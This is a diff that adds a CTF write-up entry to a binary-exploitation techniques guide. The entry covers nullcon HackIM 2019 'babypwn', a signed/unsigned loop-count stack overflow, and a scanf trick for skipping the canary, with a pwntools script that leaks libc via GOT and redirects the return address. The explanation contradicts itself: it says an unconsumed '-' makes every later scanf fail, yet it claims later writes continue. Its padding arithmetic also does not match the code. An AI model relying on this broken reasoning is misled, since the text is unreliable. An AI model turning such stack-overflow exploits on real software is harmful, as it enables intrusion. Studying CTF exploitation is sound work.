@@ -23,6 +23,7 @@
 - [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
 - [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
 - [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
+- [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
 
 ---
 
@@ -574,3 +575,37 @@ p.send(b'A' * overflow_to_fp + b'\xa9')
 **Key insight:** PIE randomises only page-aligned bits. Any two code addresses that share a page differ exclusively in the low 12 bits, so a single-byte overwrite is an ASLR-free partial overwrite whenever you can land the victim function in the same page during compilation.
 
 **References:** P.W.N. CTF 2018 — Important Service, writeup 12041
+
+---
+
+## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)
+
+**Pattern (babypwn):** `coin_count` is compared as signed (`(char)count > 20` rejects only positive overflow) but iterated as unsigned (`for (uint8_t i = 0; i < count; ++i)`). Sending `128` passes the check yet loops 128 times, walking past a 20-slot int array, the stack canary, saved RBP, and saved RIP. The standard "leak the canary with the same bug" trick fails because the vulnerable `printf` fires only **after** the overflow loop. Instead, feed scanf an invalid-but-format-conforming token on the two canary iterations so scanf returns error **without consuming input and without writing** — the canary stays intact while subsequent iterations continue writing past it.
+
+```python
+from pwn import *
+
+target.sendline('y')
+target.sendline('2019')           # name
+target.sendline('128')            # unsigned char > 20 passes signed check
+
+# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
+target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
+target.sendline(str(0))           # free@GOT upper 32 bits
+# ... repeat for puts / setbuf / printf ...
+
+for i in range(14):               # pad to reach canary slot (22 writes in)
+    target.sendline('1')
+    target.sendline('2')
+
+target.sendline('-')              # "-" matches "%d" prefix but can't be a number
+target.sendline('-')              # scanf returns error, leaves canary untouched
+target.sendline('0')              # saved libc_csu_init slot - scratch
+target.sendline('0')
+target.sendline(str(0x400806))    # return address -> main() for stage 2
+target.sendline(str(0))
+```
+
+**Key insight:** `scanf("%d", ...)` treats a lone `-` as a format mismatch — it returns early without writing to the destination and, crucially, without consuming the `-` byte; the next scanf call will then fail identically. Using this skip primitive you can surgically choose which iterations of a "fixed-count" write loop actually land on the stack, letting you hop over canary/RBP slots to reach the return address. Combine with a signed/unsigned char comparison bug to get a loop count larger than the declared max.
+
+**References:** nullcon HackIM 2019 — babypwn, writeup 13211
